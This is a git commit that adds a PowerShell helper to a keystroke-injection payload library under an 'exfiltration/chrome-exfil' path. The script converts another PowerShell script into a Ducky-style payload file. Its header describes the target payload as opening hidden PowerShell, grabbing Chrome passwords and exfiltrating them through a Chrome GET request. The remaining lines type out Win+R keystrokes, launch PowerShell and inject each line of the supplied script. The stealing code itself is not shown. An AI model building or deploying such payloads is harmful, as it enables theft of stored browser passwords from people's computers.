e0afc8aaf880274681a64143a6216a21bc9acd19
Robert <rwallhead@gmail.com>
2022-05-29 10:19:37 +1000

    Simple helper script to speed up development

---
+++ payloads/library/exfiltration/chrome-exfil/simpleloader.ps1
@@ -0,0 +1,25 @@
+# Simple packager for powershell command and submission creator.
+param([Parameter(Mandatory=$true)][string]$scriptFileName)
+
+$script = Get-Content -Raw $scriptFileName
+$outputFile = "payload.txt"
+
+"REM Title: Chrome Exfil",
+"REM Author: Robert Wallhead",
+"REM Description: Opens hidden powershell, grabs Chrome passwords, exfils via Chrome GET request.",
+"REM Target: Windows 10 (Powershell + Chrome)",
+"REM Version: 1.0",
+"REM Category: Exfiltration",
+"DELAY 5000",
+"GUI r",
+"DELAY 250",
+"STRING powershell",
+"ENTER",
+"DELAY 2500",
+"STRING pwsh",
+"ENTER",
+"DELAY 2500" | Out-File -e "ASCII" "$outputFile"
+
+$script.split("`n") | ForEach {"STRING $_" | Out-File -a -e "ASCII" "$outputFile"}
+
+"ENTER" | Out-File -a -e "ASCII" "$outputFile"
